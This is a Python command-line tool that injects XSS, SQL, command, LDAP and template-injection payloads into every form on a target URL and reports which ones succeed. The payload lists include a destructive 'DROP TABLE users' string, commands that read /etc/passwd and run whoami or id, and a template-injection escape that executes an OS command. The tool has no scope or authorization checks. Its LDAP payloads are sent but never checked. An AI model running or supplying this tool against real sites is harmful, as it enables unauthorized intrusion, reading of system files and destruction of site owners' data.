
import requests
import sys
import json
import time
import random
from urllib.parse import urljoin, quote
from bs4 import BeautifulSoup
import concurrent.futures
import argparse

class PayloadInjectionTool:
    def __init__(self, target_url, payloads=None, delay=1):
        self.target_url = target_url
        self.delay = delay
        self.session = requests.Session()
        self.vulnerabilities_found = []

        self.payload_sets = {
            'xss': [
                '<script>alert("XSS")</script>',
                '\'><svg/onload=alert("XSS")>',
                '"><img src=x onerror=alert("XSS")>',
                '<svg/onload=confirm("XSS")>',
                'javascript:alert("XSS")',
                '<body onload=alert("XSS")>',
                '<input autofocus onfocus=alert("XSS")>',
                '<<SCRIPT>alert("XSS");//<</SCRIPT>'
            ],
            'sql_injection': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, NULL, NULL --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
                "' OR 1=1 --",
                "admin'--"
            ],



            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& id",
                "; cat /etc/passwd",
                "| net user",
                "&& dir C:\\",
                "; ping 127.0.0.1",
                "| echo 'command injection'",
                "__import__('os').system('id')"
            ],
            'ldap_injection': [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*)",
                "*))%00",
                "*()|&'",
                "admin*",
                "*)(objectClass=*"
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "${class.getClassLoader()}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{''.constructor.constructor('alert(1)')()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ]
        }

        if payloads:
            self.custom_payloads = payloads
        else:
            self.custom_payloads = []

    def get_forms(self, url):

        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"Error getting forms from {url}: {e}")
            return []

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()

        inputs = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            inputs.append({'type': input_type, 'name': input_name})

        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details

    def inject_payload(self, form_details, payload, vulnerability_type):
        target_url = urljoin(self.target_url, form_details['action'])
        data = {}

        for input_field in form_details['inputs']:
            if input_field['type'] in ['text', 'search', 'email', 'password']:
                data[input_field['name']] = payload

        try:
            if form_details['method'] == 'post':
                response = self.session.post(target_url, data=data)
            else:
                response = self.session.get(target_url, params=data)

            return response
        except Exception as e:
            print(f"Error injecting payload: {e}")
            return None

    def check_xss_vulnerability(self, response, payload):
        if response and payload in response.text:
            return True
        return False

    def check_sql_vulnerability(self, response, payload):
        if not response:
            return False

        sql_errors = [
            'you have an error in your sql syntax',
            'warning: mysql',
            'unclosed quotation mark',
            'quoted string not properly terminated',
            'syntax error',
            'ora-00933',
            'ora-00921',
            'microsoft ole db provider for sql server'
        ]

        response_text = response.text.lower()
        for error in sql_errors:
            if error in response_text:
                return True
        return False

    def check_command_injection(self, response, payload):
        if not response:
            return False

        command_indicators = [
            'uid=', 'gid=', 'groups=',  # Linux id command
            'root:', 'bin:', 'daemon:',  # /etc/passwd
            'volume serial number',      # Windows dir
            'ping statistics',           # ping command
            'directory of'               # Windows dir command
        ]

        response_text = response.text.lower()
        for indicator in command_indicators:
            if indicator in response_text:
                return True
        return False

    def check_template_injection(self, response, payload):
        if not response:
            return False

        # Check if mathematical expressions are evaluated
        if '{{7*7}}' in payload and '49' in response.text:
            return True
        if '${7*7}' in payload and '49' in response.text:
            return True
        if '#{7*7}' in payload and '49' in response.text:
            return True

        return False

    def test_vulnerability_type(self, vulnerability_type):
        print(f"\n[+] Testing for {vulnerability_type.upper()} vulnerabilities...")

        forms = self.get_forms(self.target_url)
        if not forms:
            print(f"[-] No forms found on {self.target_url}")
            return

        print(f"[+] Found {len(forms)} forms to test")

        payloads = self.payload_sets.get(vulnerability_type, [])
        if self.custom_payloads:
            payloads.extend(self.custom_payloads)

        for i, form in enumerate(forms):
            form_details = self.get_form_details(form)
            print(f"\n[*] Testing form {i+1}/{len(forms)}")

            for payload in payloads:
                print(f"[*] Trying payload: {payload[:50]}...")

                response = self.inject_payload(form_details, payload, vulnerability_type)
                time.sleep(self.delay)  # Rate limiting

                vulnerable = False
                if vulnerability_type == 'xss':
                    vulnerable = self.check_xss_vulnerability(response, payload)
                elif vulnerability_type == 'sql_injection':
                    vulnerable = self.check_sql_vulnerability(response, payload)
                elif vulnerability_type == 'command_injection':
                    vulnerable = self.check_command_injection(response, payload)
                elif vulnerability_type == 'template_injection':
                    vulnerable = self.check_template_injection(response, payload)

                if vulnerable:
                    vuln_info = {
                        'type': vulnerability_type,
                        'url': self.target_url,
                        'form': form_details,
                        'payload': payload,
                        'timestamp': time.time()
                    }
                    self.vulnerabilities_found.append(vuln_info)
                    print(f"[+] VULNERABILITY FOUND: {vulnerability_type.upper()}")
                    print(f"    Payload: {payload}")
                    print(f"    Form Action: {form_details['action']}")
                    break  # Move to next form after finding vulnerability

    def test_all_vulnerabilities(self):
        for vuln_type in self.payload_sets.keys():
            self.test_vulnerability_type(vuln_type)

    def generate_report(self, output_file=None):
        '''Generate vulnerability report'''
        if not self.vulnerabilities_found:
            print("\n[+] No vulnerabilities found!")
            return

        report = {
            'target_url': self.target_url,
            'scan_timestamp': time.time(),
            'vulnerabilities_count': len(self.vulnerabilities_found),
            'vulnerabilities': self.vulnerabilities_found
        }

        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Report saved to {output_file}")
        else:
            print("\n[+] VULNERABILITY REPORT")
            print("=" * 50)
            for vuln in self.vulnerabilities_found:
                print(f"Type: {vuln['type'].upper()}")
                print(f"URL: {vuln['url']}")
                print(f"Payload: {vuln['payload']}")
                print(f"Form Action: {vuln['form']['action']}")
                print("-" * 30)

def main():
    parser = argparse.ArgumentParser(description='Website Payload Injection Tool')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-t', '--type', choices=['xss', 'sql_injection', 'command_injection', 'template_injection', 'all'],
                        default='all', help='Vulnerability type to test for')
    parser.add_argument('-p', '--payloads', help='File containing custom payloads (one per line)')
    parser.add_argument('-d', '--delay', type=int, default=1, help='Delay between requests in seconds')
    parser.add_argument('-o', '--output', help='Output file for results')

    args = parser.parse_args()

    custom_payloads = []
    if args.payloads:
        try:
            with open(args.payloads, 'r') as f:
                custom_payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error loading payloads file: {e}")

    tool = PayloadInjectionTool(args.url, custom_payloads, args.delay)

    print(f"[+] Starting payload injection test on: {args.url}")
    print(f"[+] Testing for: {args.type}")

    if args.type == 'all':
        tool.test_all_vulnerabilities()
    else:
        tool.test_vulnerability_type(args.type)

    tool.generate_report(args.output)

if __name__ == "__main__":

    main()
